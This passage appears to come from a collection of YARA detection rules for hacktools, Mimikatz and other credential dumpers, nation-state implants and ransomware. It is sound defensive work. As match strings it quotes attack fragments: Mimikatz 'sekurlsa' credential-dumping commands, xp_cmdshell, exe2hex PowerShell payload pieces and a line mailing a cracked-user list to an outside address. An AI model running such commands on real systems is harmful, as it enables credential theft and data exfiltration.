\"56b476cba702a4423a2d805a412cae8ef4330905\"\n\tstrings:\n\t\t$s0 = \"# pscan completed in %u seconds. (found %d ips)\" fullword ascii\n\t\t$s1 = \"Usage: %s <b-block> <port> [c-block]\" fullword ascii\n\t\t$s3 = \"%s.%d.* (total: %d) (%.1f%% done)\" fullword ascii\n\t\t$s8 = \"Invalid IP.\" fullword ascii\n\t\t$s9 = \"# scanning: \" fullword ascii\n\t\t$s10 = \"Unable to allocate socket.\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule LinuxHacktool_eyes_a {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file a\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"458ada1e37b90569b0b36afebba5ade337ea8695\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"mv scan.log bios.txt\" fullword ascii\n\t\t$s2 = \"rm -rf bios.txt\" fullword ascii\n\t\t$s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n\t\t$s4 = \"././pscan2 $1 22\" fullword ascii\n\t\t$s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule LinuxHacktool_eyes_mass {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file mass\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"2054cb427daaca9e267b252307dad03830475f15\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"echo -e \\\"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\\\n\\\\r\" ascii\n\t\t$s3 = \"killall -9 pscan2\" fullword ascii\n\t\t$s5 = \"echo \\\"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\\\"\" fullword ascii\n\t\t$s6 = \"echo -e \\\"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\\\"\" fullword ascii\n\tcondition:\n\t\t1 of them\n}\n\nrule LinuxHacktool_eyes_pscan2_2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2.c\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"eb024dfb441471af7520215807c34d105efa5fd8\"\n\tstrings:\n\t\t$s0 = \"snprintf(outfile, sizeof(outfile) - 1, \\\"scan.log\\\", argv[1], argv[2]);\" fullword ascii\n\t\t$s2 = \"printf(\\\"Usage: %s <b-block> <port> [c-block]\\\\n\\\", argv[0]);\" fullword ascii\n\t\t$s3 = \"printf(\\\"\\\\n# pscan completed in %u seconds. (found %d ips)\\\\n\\\", (time(0) - sca\" ascii\n\t\t$s19 = \"connlist[i].addr.sin_family = AF_INET;\" fullword ascii\n\t\t$s20 = \"snprintf(last, sizeof(last) - 1, \\\"%s.%d.* (total: %d) (%.1f%% done)\\\",\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule CN_Portscan : APT\n{\n    meta:\n        description = \"CN Port Scanner\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n    \t$s1 = \"MZ\"\n\t\t$s2 = \"TCP 12.12.12.12\"\n    condition:\n        ($s1 at 0) and $s2\n}\n\nrule WMI_vbs : APT\n{\n    meta:\n        description = \"WMI Tool - APT\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n\t\t$s3 = \"WScript.Echo \\\"   $$\\\\      $$\\\\ $$\\\\      $$\\\\ $$$$$$\\\\ $$$$$$$$\\\\ $$\\\\   $$\\\\ $$$$$$$$\\\\  $$$$$$\"\n    condition:\n        all of them\n}\n\nrule CN_Toolset__XScanLib_XScanLib_XScanLib {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\tsuper_rule = 1\n\t\thash0 = \"af419603ac28257134e39683419966ab3d600ed2\"\n\t\thash1 = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\t\thash2 = \"135f6a28e958c8f6a275d8677cfa7cb502c8a822\"\n\tstrings:\n\t\t$s1 = \"Plug-in thread causes an exception, failed to alert user.\" fullword\n\t\t$s2 = \"PlugGetUdpPort\" fullword\n\t\t$s3 = \"XScanLib.dll\" fullword\n\t\t$s4 = \"PlugGetTcpPort\" fullword\n\t\t$s11 = \"PlugGetVulnNum\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Toolset_NTscan_PipeCmd {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"a931d65de66e1468fe2362f7f2e0ee546f225c4e\"\n\tstrings:\n\t\t$s2 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s3 = \"PipeCmd.exe\" fullword wide\n\t\t$s4 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"%s\\\\ADMIN$\\\\System32\\\\%s\" fullword ascii\n\t\t$s9 = \"PipeCmdSrv.exe\" fullword ascii\n\t\t$s10 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s13 = \"\\\\\\\\.\\\\pipe\\\\PipeCmd_communicaton\" fullword ascii\n\t\t$s14 = \"PIPECMDSRV\" fullword wide\n\t\t$s15 = \"PipeCmd Service\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule CN_Toolset_LScanPortss_2 {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"4631ec57756466072d83d49fbc14105e230631a0\"\n\tstrings:\n\t\t$s1 = \"LScanPort.EXE\" fullword wide\n\t\t$s3 = \"www.honker8.com\" fullword wide\n\t\t$s4 = \"DefaultPort.lst\" fullword ascii\n\t\t$s5 = \"Scan over.Used %dms!\" fullword ascii\n\t\t$s6 = \"www.hf110.com\" fullword wide\n\t\t$s15 = \"LScanPort Microsoft \" fullword wide\n\t\t$s18 = \"L-ScanPort2.0 CooFly\" fullword wide\n\tcondition:\n\t\t4 of them\n}\n\nrule CN_Toolset_sig_1433_135_sqlr {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"8542c7fb8291b02db54d2dc58cd608e612bfdc57\"\n\tstrings:\n\t\t$s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n\t\t$s11 = \";DATABASE=master\" fullword ascii\n\t\t$s12 = \"xp_cmdshell '\" fullword ascii\n\t\t$s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n\tcondition:\n\t\tall of them\n}\n\n\n/* Mimikatz */\n\nrule Mimikatz_Memory_Rule_1 : APT {\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"12/22/2014\"\n\t\tscore = 70\n\t\ttype = \"memory\"\n\t\tdescription = \"Detects password dumper mimikatz in memory\"\n\tstrings:\n\t\t$s1 = \"sekurlsa::msv\" fullword ascii\n\t    $s2 = \"sekurlsa::wdigest\" fullword ascii\n\t    $s4 = \"sekurlsa::kerberos\" fullword ascii\n\t    $s5 = \"sekurlsa::tspkg\" fullword ascii\n\t    $s6 = \"sekurlsa::livessp\" fullword ascii\n\t    $s7 = \"sekurlsa::ssp\" fullword ascii\n\t    $s8 = \"sekurlsa::logonPasswords\" fullword ascii\n\t    $s9 = \"sekurlsa::process\" fullword ascii\n\t    $s10 = \"ekurlsa::minidump\" fullword ascii\n\t    $s11 = \"sekurlsa::pth\" fullword ascii\n\t    $s12 = \"sekurlsa::tickets\" fullword ascii\n\t    $s13 = \"sekurlsa::ekeys\" fullword ascii\n\t    $s14 = \"sekurlsa::dpapi\" fullword ascii\n\t    $s15 = \"sekurlsa::credman\" fullword ascii\n\tcondition:\n\t\t1 of them\n}\n\nrule Mimikatz_Memory_Rule_2 : APT {\n\tmeta:\n\t\tdescription = \"Mimikatz Rule generated from a memory dump\"\n\t\tauthor = \"Florian Roth - Florian Roth\"\n\t\ttype = \"memory\"\n\t\tscore = 80\n\tstrings:\n\t\t$s0 = \"sekurlsa::\" ascii\n\t\t$x1 = \"cryptprimitives.pdb\" ascii\n\t\t$x2 = \"Now is t1O\" ascii fullword\n\t\t$x4 = \"ALICE123\" ascii\n\t\t$x5 = \"BOBBY456\" ascii\n\tcondition:\n\t\t$s0 and 1 of ($x*)\n}\n\nrule mimikatz\n{\n\tmeta:\n\t\tdescription\t\t= \"mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Benjamin DELPY (gentilkiwi)\"\n      score          = 80\n\tstrings:\n\t\t$exe_x86_1\t\t= { 89 71 04 89 [0-3] 30 8d 04 bd }\n\t\t$exe_x86_2\t\t= { 89 79 04 89 [0-3] 38 8d 04 b5 }\n\n\t\t$exe_x64_1\t\t= { 4c 03 d8 49 [0-3] 8b 03 48 89 }\n\t\t$exe_x64_2\t\t= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }\n\n\t\t$dll_1\t\t\t= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }\n\t\t$dll_2\t\t\t= { c7 0? 10 02 00 00 ?? 89 4? }\n\n\t\t$sys_x86\t\t= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }\n\t\t$sys_x64\t\t= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }\n\n\tcondition:\n\t\t(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))\n}\n\n\nrule mimikatz_lsass_mdmp\n{\n\tmeta:\n\t\tdescription\t\t= \"LSASS minidump file for mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$lsass\t\t\t= \"System32\\\\lsass.exe\"\twide nocase\n\n\tcondition:\n\t\t(uint32(0) == 0x504d444d) and $lsass\n}\n\nrule wce\n{\n\tmeta:\n\t\tdescription\t\t= \"wce\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Hernan Ochoa (hernano)\"\n\n\tstrings:\n\t\t$hex_legacy\t\t= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }\n\t\t$hex_x86\t\t= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }\n\t\t$hex_x64\t\t= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }\n\n\tcondition:\n\t\tany of them\n}\n\n\nrule lsadump\n{\n\tmeta:\n\t\tdescription\t\t= \"LSA dump programe (bootkey/syskey) - pwdump and others\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$str_sam_inc\t= \"\\\\Domains\\\\Account\" ascii nocase\n\t\t$str_sam_exc\t= \"\\\\Domains\\\\Account\\\\Users\\\\Names\\\\\" ascii nocase\n\t\t$hex_api_call\t= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }\n\t\t$str_msv_lsa\t= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }\n\t\t$hex_bkey\t\t= { 4b 53 53 4d [20-70] 05 00 01 00}\n\n\tcondition:\n\t\t( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )\n      and not uint16(0) == 0x5a4d\n}\n\nrule Mimikatz_Logfile\n{\n\tmeta:\n\t\tdescription = \"Detects a log file generated by malicious hack tool mimikatz\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 80\n\t\tdate = \"2015/03/31\"\n\t\treference = \"https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar\"\n\tstrings:\n\t\t$s1 = \"SID               :\" ascii fullword\n\t\t$s2 = \"* NTLM     :\" ascii fullword\n\t\t$s3 = \"Authentication Id :\" ascii fullword\n\t\t$s4 = \"wdigest :\" ascii fullword\n\tcondition:\n\t\tall of them\n}\n\nrule AppInitHook {\n\tmeta:\n\t\tdescription = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/Z292v6\"\n\t\tdate = \"2015-07-15\"\n\t\tscore = 70\n\t\thash = \"e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45\"\n\tstrings:\n\t\t$s0 = \"\\\\Release\\\\AppInitHook.pdb\" ascii\n\t\t$s1 = \"AppInitHook.dll\" fullword ascii\n\t\t$s2 = \"mimikatz.exe\" fullword wide\n\t\t$s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n\t\t$s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n\t\t$s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n\t\t$s6 = \"VoidFunc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule VSSown_VBS {\n\tmeta:\n\t\tdescription = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-10-01\"\n\t\tscore = 75\n\tstrings:\n\t\t$s0 = \"Select * from Win32_Service Where Name ='VSS'\" ascii\n\t\t$s1 = \"Select * From Win32_ShadowCopy\" ascii\n\t\t$s2 = \"cmd /C mklink /D \" ascii\n\t\t$s3 = \"ClientAccessible\" ascii\n\t\t$s4 = \"WScript.Shell\" ascii\n\t\t$s5 = \"Win32_Process\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule wineggdrop : portscanner toolkit\n{\n    meta:\n        author = \"Christian Rebischke (@sh1bumi)\"\n        date = \"2015-09-05\"\n        description = \"Rules for TCP Portscanner VX.X by WinEggDrop\"\n        in_the_wild = true\n        family = \"Hackingtool/Portscanner\"\n\n    strings:\n        $a = { 54 43 50 20 50 6f 72 74 20 53 63 61 6e 6e 65 72 \n               20 56 3? 2e 3? 20 42 79 20 57 69 6e 45 67 67 44 \n               72 6f 70 0a } \n        $b = \"Result.txt\"\n        $c = \"Usage:   %s TCP/SYN StartIP [EndIP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]\\n\"\n\n    condition:\n        //check for MZ Signature at offset 0\n        uint16(0) == 0x5A4D\n\n        and\n\n        //check for wineggdrop specific strings\n        $a and $b and $c \n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2016-01-15\n\tIdentifier: Exe2hex\n*/\n\nrule Payload_Exe2Hex : toolkit {\n\tmeta:\n\t\tdescription = \"Detects payload generated by exe2hex\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/g0tmi1k/exe2hex\"\n\t\tdate = \"2016-01-15\"\n\t\tscore = 70\n\tstrings:\n\t\t$a1 = \"set /p \\\"=4d5a\" ascii\n\t\t$a2 = \"powershell -Command \\\"$hex=\" ascii\n\t\t$b1 = \"set+%2Fp+%22%3D4d5\" ascii\n\t\t$b2 = \"powershell+-Command+%22%24hex\" ascii\n\t\t$c1 = \"echo 4d 5a \" ascii\n\t\t$c2 = \"echo r cx >>\" ascii\n\t\t$d1 = \"echo+4d+5a+\" ascii\n\t\t$d2 = \"echo+r+cx+%3E%3E\" ascii\n\tcondition:\n\t\tall of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)\n}\n\nimport \"pe\"\n\nrule DeltaCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94 A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77 48 EE 6F 4B  73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2 AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED 39 3F FA D0 AD 3D D9 C5 3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13 B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}\n\t\t           \n\tcondition:\n\t\tany of them\n}\n\nimport \"pe\"\n\nrule HotelAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58dab205ecb1e0972027eb92f68cec6d208e5ab5.ex_\"\n\n\tstrings:\n\t\n\t$resourceHTML = \"RSRC_HTML\"\n\t/*\n\t\t8A 0C 18  mov     cl, [eax+ebx]\n\t\t80 F1 63  xor     cl, 63h\n\t\t88 0C 18  mov     [eax+ebx], cl\n\t\t8B 4D 00  mov     ecx, [ebp+0]\n\t\t40        inc     eax\n\t\t3B C1     cmp     eax, ecx\n\t\t72 EF     jb      short loc_4010B4\n\t*/\n\n\t$rscsDecoderLoop = {8A [2] 80 F1 ?? 88 [2] 8B [2] 40 3B ?? 72 EF}\n\n\tcondition:\n\t\t$resourceHTML and $rscsDecoderLoop in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\nrule IndiaAlfa_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"HwpFilePathCheck.dll\"\n\t\t$ = \"AdobeArm.exe\"\n\t\t$ = \"OpenDocument\"\n\t\t\n\tcondition:\n\t\t2 of them\n\n}\n\nrule IndiaAlfa_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"ExePath: %s\\nXlsPath: %s\\nTmpPath: %s\\n\"\n\t\t\n\tcondition:\n\t\tany of them\n\n}\nimport \"pe\"\n\nrule IndiaBravo_PapaAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"pmsconfig.msi\" wide\n\t\t$ = \"scvrit001.bat\"\n\tcondition:\n\t\tall of them\n}\n\nrule IndiaBravo_RomeoCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58ad28ac4fb911abb6a20382456c4ad6fe5c8ee5.ex_\"\n\t\tStatus = \"Signature is too loose to be useful.\"\n\t\t\n\tstrings:\n\t/*\n\t\t50                 push    eax             ; argp\n\t\t68 7E 66 04 80     push    8004667Eh       ; cmd\n\t\t8B 8D DC FE FF FF  mov     ecx, [ebp+skt]\n\t\t51                 push    ecx             ; s\n\t\tFF 15 58 31 41 00  call    ioctlsocket\n\t\t83 F8 FF           cmp     eax, 0FFFFFFFFh\n\t\t75 08              jnz     short loc_4043F0\n\t*/\n\n\t$a = {50 68 7E 66 04 80 8B 8D [4] 51 FF 15 [4] 83 F8 FF 75}\n\t$b1 = \"xc123465-efff-87cc-37abcdef9\"\n\t$b2 = \"[Check] - PORT ERROR...\" wide\n\t$b3 = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\nrule IndiaBravo_RomeoBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"6e3db4da27f12eaba005217eba7cd9133bc258c97fe44605d12e20a556775009\"\n\n\tstrings:\n\t/*\n\t\tE8 C3 FE FF FF     call    generate64ByteRandomNumber\n\t\t68 C8 01 00 00     push    1C8h            ; dwLength\n\t\t68 D8 E8 40 00     push    offset g_Config ; pvBuffer\n\t\tA3 80 EA 40 00     mov     dword ptr g_Config.qwIdentifier, eax\n\t\t89 15 84 EA 40 00  mov     dword ptr g_Config.qwIdentifier+4, edx\n\t\tE8 F9 E9 FF FF     call    DNSCALCDecode\n\t\t83 C4 08           add     esp, 8\n\t\t8D 4C 24 08        lea     ecx, [esp+214h+var_20C]\n\t\t6A 00              push    0\n\t\t51                 push    ecx\n\t\t68 C8 01 00 00     push    1C8h\n\t\t68 D8 E8 40 00     push    offset g_Config\n\t\t56                 push    esi\n\t\tFF 15 74 E7 40 00  call    WriteFile_9\n\t\t56                 push    esi\n\t\tFF 15 6C E7 40 00  call    CloseHandle_9\n\t*/\n\n\t$a = {E8 [4] 68 [2] 00 00 68 [4] A3 [4]\t89 15 [4] E8 [4] 83 C4 08 8D [3] 6A 00 5? 68 [2] 00 00 \t68 [4] 5? FF 15 [4] 5? \tFF 15}\n\t\t\n\t\t$b1 = \"tmscompg.msi\" wide\n\t\t$b2 = \"cvrit000.bat\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\n\nrule IndiaBravo_generic\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$extractDll = \"[2] - Extract Dll...\" wide\n\t\t$createSvc = \"[3] - CreateSVC...\" wide\n\n\tcondition:\n\t\tall of them\n\t\n}\n\nrule IndiaCharlie_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"WMPNetworkSvcUpdate\"\n\t\t$ = \"backSched.dll\"\n\t\t$ = \"\\\\mspaint.exe\"\n\t\t$aesKey = \"X,LLIe{))%%l2i<[AM|aq!Ql/lPlw]d7@C-#j.<c|#*}Kx4_H(q^F-F^p/[t#%HT\"\n\tcondition:\n\t\t2 of them or $aesKey\n}\n\nrule IndiaCharlie_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$s1 = \"%s is an essential element in Windows System configuration and management. %s\"\n\t\t$s2 = \"%SYSTEMROOT%\\\\system32\\\\svchost.exe -k \"\n\t\t$s3 = \"%s\\\\system32\\\\%s\"\n\t\t$s4 = \"\\\\mspaint.exe\"\n\t\t$s5 = \":R\\nIF NOT EXIST %s GOTO E\\ndel /a %s\\nGOTO R\\n:E\\ndel /a d.bat\"\n\t\t$aesKey = \"}[eLkQAeEae0t@h18g!)3x-RvE%+^`n.6^()?+00ME6a&F7vcV}`@.dj]&u$o*vX\"\n\n\tcondition:\n\t\t3 of ($s*) or $aesKey\n}",
  "Ransom_Satana": "rule Ransom_Satana\n{\n    meta:\n        description = \"Regla para detectar Ransom.Satana\"\n        author = \"CCN-CERT\"\n        version = \"1.0\"\n    strings:\n        $a = { 21 00 73 00 61 00 74 00 61 00 6E 00 61 00 21 00 2E 00 74 00 78 00 74 00 00 }\n        $b = { 74 67 77 79 75 67 77 71 }\n        $c = { 53 77 76 77 6E 67 75 }\n        $d = { 45 6E 75 6D 4C 6F 63 61 6C 52 65 73 }\n        $e = { 57 4E 65 74 4F 70 65 6E 45 6E 75 6D 57 00 }\n        $f = { 21 53 41 54 41 4E 41 21 }\n    condition:\n        $b or $c and $d and $a and $e and $f\n}",
  "Ransom_Satana_Dropper": "rule Ransom_Satana_Dropper\n{\n    meta:\n        description = \"Regla para detectar el dropper de Ransom.Satana\"\n        author = \"CCN-CERT\"\n        version = \"1.0\"\n    strings:\n        $a = { 25 73 2D 54 72 79 45 78 63 65 70 74 }\n        $b = { 64 3A 5C 6C 62 65 74 77 6D 77 79 5C 75 69 6A 65 75 71 70 6C 66 77 75 62 2E 70 64 62 }\n        $c = { 71 66 6E 74 76 74 68 62 }\n    condition:\n        all of them\n}",
  "unpacked_shiva_ransomware": "rule unpacked_shiva_ransomware {\n\n   meta:\n\n      description = \"Rule to detect an unpacked sample of Shiva ransopmw\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/malwrhunterteam/status/1037424962569732096\"\n    \n   strings:\n\n      $s1 = \"c:\\\\Users\\\\sys\\\\Desktop\\\\v 0.5\\\\Shiva\\\\Shiva\\\\obj\\\\Debug\\\\shiva.pdb\" fullword ascii\n      $s2 = \"This email will be as confirmation you are ready to pay for decryption key.\" fullword wide\n      $s3 = \"Your important files are now encrypted due to a security problem with your PC!\" fullword wide\n      $s4 = \"write.php?info=\" fullword wide\n      $s5 = \" * Do not try to decrypt your data using third party software, it may cause permanent data loss.\" fullword wide\n      $s6 = \" * Do not rename encrypted files.\" fullword wide\n      $s7 = \".compositiontemplate\" fullword wide\n      $s8 = \"You have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\" fullword wide\n      $s9 = \"\\\\READ_IT.txt\" fullword wide\n      $s10 = \".lastlogin\" fullword wide\n      $s11 = \".logonxp\" fullword wide\n      $s12 = \" * Decryption of your files with the help of third parties may cause increased price\" fullword wide\n      $s13 = \"After payment we will send you the decryption tool that will decrypt all your files.\" fullword wide\n   \n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 800KB ) and all of them \n}",
  "sigma_ransomware": "rule sigma_ransomware {\n\n  meta:\n    author = \"J from THL <j@techhelplist.com>\"\n    date = \"20180509\"\n    reference1 = \"https://www.virustotal.com/#/file/705ad78bf5503e6022f08da4c347afb47d4e740cfe6c39c08550c740c3be96ba\"\n    reference2 = \"https://www.virustotal.com/#/file/bb3533440c27a115878ae541aba3bda02d441f3ea1864b868862255aabb0c8ff\"\n    version = 1\n    maltype = \"Ransomware\"\n    filetype = \"memory\"\n\n  strings:\n    $a = \".php?\"\n    $b = \"uid=\"\n    $c = \"&uname=\"\n    $d = \"&os=\"\n    $e = \"&pcname=\"\n    $f = \"&total=\"\n    $g = \"&country=\"\n    $h = \"&network=\"\n    $i = \"&subid=\"\n\n  condition:\n    all of them\n}",
